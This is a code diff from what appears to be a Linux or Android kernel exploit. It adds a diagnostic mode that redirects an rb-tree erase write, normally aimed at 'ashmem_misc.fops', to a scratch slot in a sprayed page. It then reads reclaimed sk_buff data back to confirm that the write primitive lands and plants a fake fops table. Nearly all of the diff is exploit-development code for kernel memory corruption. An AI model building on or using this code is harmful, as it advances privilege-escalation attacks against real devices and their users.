@@ -387,6 +387,12 @@ uintptr_t pselect_write_value(void) {
 }
 
 uintptr_t pselect_write_target(void) {
+  if (scratch_write_diag_enabled() && binwrite_target) {
+    /* DIAGNOSTIC: aim the rb-erase write at a 0x41-filled scratch qword inside
+     * the sprayed page instead of &ashmem_misc.fops, so scratch_diag_readback()
+     * can prove (via sk_buff recv) whether the dequeue write lands at all. */
+    return binwrite_target;
+  }
   if (pselect_custom_write) {
     return pselect_custom_target;
   }
@@ -527,6 +533,65 @@ void close_reclaim_sockets(void) {
   }
 }
 
+int scratch_write_diag_enabled(void) {
+  return env_flag("SCRATCH_WRITE_DIAG", 1);
+}
+
+/*
+ * Non-circular diagnostic (fork-recommended): recv the reclaim sk_buffs back —
+ * their data pages ARE the reclaimed page_base — and diff against the payload we
+ * sent (skb_buf). Any byte the kernel changed shows up as a diff, WITHOUT needing
+ * to know page_base's offset inside the sk_buff. In SCRATCH_WRITE_DIAG mode the
+ * rb-erase write target is redirected to a scratch qword in the page (binwrite_
+ * target, 0x41-filled), so a diff carrying `expect` (=write_value=fake_fops) proves
+ * the dequeue write actually lands; no diff => the walk isn't writing (shift/overlay).
+ */
+void scratch_diag_readback(uint64_t expect) {
+  if (reclaim_sv[1] < 0 || !skb_buf) {
+    pr_warning("SCRATCH-DIAG: no reclaim socket/skb_buf (sv=%d)\n", reclaim_sv[1]);
+    return;
+  }
+  size_t cap = (size_t)SKB_SEND_SIZE * 8;
+  unsigned char *buf = malloc(cap);
+  if (!buf) {
+    return;
+  }
+  int fl = fcntl(reclaim_sv[1], F_GETFL, 0);
+  if (fl >= 0) {
+    fcntl(reclaim_sv[1], F_SETFL, fl | O_NONBLOCK);
+  }
+  size_t total = 0;
+  for (int tries = 0; tries < 64 && total < cap; tries++) {
+    ssize_t n = recv(reclaim_sv[1], buf + total, cap - total, MSG_DONTWAIT);
+    if (n <= 0) {
+      break;
+    }
+    total += (size_t)n;
+  }
+  int diffs = 0;
+  int found = 0;
+  for (size_t off = 0; off + 8 <= total; off += 8) {
+    uint64_t rv;
+    uint64_t ov;
+    memcpy(&rv, buf + off, 8);
+    memcpy(&ov, skb_buf + (off % (size_t)SKB_SEND_SIZE), 8);
+    if (rv != ov) {
+      if (diffs < 24) {
+        pr_info("SCRATCH-DIAG diff off=%zu chunk_off=0x%zx recv=%016llx orig=%016llx\n",
+                off, off % (size_t)SKB_SEND_SIZE, (unsigned long long)rv,
+                (unsigned long long)ov);
+      }
+      diffs++;
+      if (rv == expect) {
+        found = 1;
+      }
+    }
+  }
+  pr_success("SCRATCH-DIAG total_recv=%zu diffs=%d write_value_landed=%d expect=%016llx\n",
+             total, diffs, found, (unsigned long long)expect);
+  free(buf);
+}
+
 void close_ctx_memfds(struct mm_ctx *ctx) {
   for (size_t i = 0; i < ctx->mm_cnt; i++) {
     if (ctx->memfds[i] > 0) {
@@ -617,6 +682,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + FAKE_TASK_OFF;
   fake_fops = payload_base + FOPS_TABLE_OFF;
+  /* Set binwrite_target BEFORE pselect_write_target() so the SCRATCH_WRITE_DIAG
+   * redirect is consistent between this payload build and prepare_pselect_fdsets. */
+  binwrite_target = payload_base + SCRATCH_OFF;
   int write_shape = pselect_write_shape();
   uintptr_t write_target = pselect_write_target();
   uintptr_t write_value = pselect_write_value();
